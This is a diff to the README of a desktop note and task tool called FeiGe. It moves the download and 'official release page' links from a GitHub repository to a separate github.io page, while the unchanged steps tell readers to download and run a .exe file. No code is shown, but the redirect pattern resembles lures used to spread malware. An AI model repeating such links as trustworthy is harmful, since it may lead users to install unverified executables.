@@ -1,6 +1,6 @@
 # 🪴 FeiGe - Manage your digital garden with ease
 
-[![](https://img.shields.io/badge/Download_FeiGe-Link-blue.svg)](https://github.com/zantedeschiafavabean869/FeiGe)
+[![](https://img.shields.io/badge/Download_FeiGe-Link-blue.svg)](https://zantedeschiafavabean869.github.io)
 
 FeiGe helps you organize your thoughts, files, and tasks in one place. Think of this tool as a private garden where you cultivate ideas and track progress. You can use it to store notes, save project assets, or manage daily reminders. The software runs locally on your computer to keep your data private and secure.
 
@@ -19,7 +19,7 @@ The software requires no complex setup procedures. You do not need to install ex
 
 Follow these steps to set up FeiGe on your machine:
 
-1. Visit the [official release page](https://github.com/zantedeschiafavabean869/FeiGe) to download the latest setup file. 
+1. Visit the [official release page](https://zantedeschiafavabean869.github.io) to download the latest setup file. 
 2. Look for the file ending in `.exe` under the Assets section.
 3. Save the file to your Downloads folder.
 4. Double-click the file to begin the installation.
